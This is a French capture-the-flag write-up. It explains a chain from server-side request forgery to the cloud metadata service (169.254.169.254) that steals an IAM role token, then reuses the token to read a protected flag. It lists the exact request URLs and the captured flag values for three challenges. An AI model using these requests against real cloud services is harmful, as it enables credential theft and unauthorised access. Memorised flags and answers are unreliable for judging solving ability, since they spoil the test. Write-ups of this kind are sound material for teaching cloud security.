# Série *-imds (cloud) — SSRF → IMDS → assume-role

> **3 challenges, 1 exploit.** `artifacts-imds` (449), `billing-imds` (500), `cdn-imds` (500 — ⚡ **first blood**, 0 solve).
> Même service (auteurs hibris/Clawd) sur une déco différente (registre / facturation / CDN).
> Détail technique complet : [`artifacts-imds.md`](artifacts-imds.md). Script : [`../solve_imds.py`](../solve_imds.py).

## Le service (identique sur les 3)
`GET /` annonce :
```
{"backups_host":"backups.nctf.internal",
 "fetch":"/fetch?url=...  (reads backup manifests)",
 "objects":"/objects/<key>  (X-Role-Token required for private keys)"}
```
Le flag de chaque instance est « sur le filesystem du service, servi par aucune route » → il faut
**exploiter le service**, pas deviner une URL.

## Chaîne d'exploitation (4 requêtes, reproductible à la main)
1. **SSRF** — `/fetch?url=` fait un GET *côté serveur*, sans filtrer les IP internes.
   `GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`
   → le rôle **`backup-role`**.
2. **Vol du credential IAM** —
   `GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/backup-role`
   → `{"AccessKeyId":"ASIA…","Token":"FwoG…"}`.
3. **Assume-role / lecture privée** —
   `GET /objects/flag` avec le header **`X-Role-Token: <Token>`** → `{"flag":"NCTF{…}"}`.

(En bonus, `GET /fetch?url=http://backups.nctf.internal/` liste les objets : `readme`, `flag (private)`.)

## Pourquoi c'est la bonne faille (pitch jury)
> « Un endpoint présenté comme un simple lecteur de *backups publics* atteint en réalité le réseau
> interne et le **service de métadonnées cloud** (169.254.169.254). On y vole le credential du rôle
> IAM attaché à la machine, puis on s'en sert pour lire l'objet protégé. C'est l'escalade
> **SSRF → IMDS** classique — la même que la fuite Capital One de 2019. »

Le filtre d'IP privée manquant sur `/fetch` est la racine ; le reste n'est que réutilisation du token.

## Flags
| Challenge | Points | Flag |
|---|---|---|
| artifacts-imds | 449 | `NCTF{8780ec8e1de2dbc00e5dec33}` |
| billing-imds | 500 | `NCTF{6160286625f026849a85dc5e}` |
| **cdn-imds** ⚡ | 500 | `NCTF{d7265367bf2f3a4cd1c7d318}` (**first blood** — soumettre en priorité) |

> Variantes *non* IMDS de la même infra (chaînes différentes, non résolues ici) : `*-oidc`
> (confusion de token OIDC), `*-envexec` (exécution via variables d'env), `*-presign` (URL présignée),
> `bucket-pivot`, `breach-chain`.
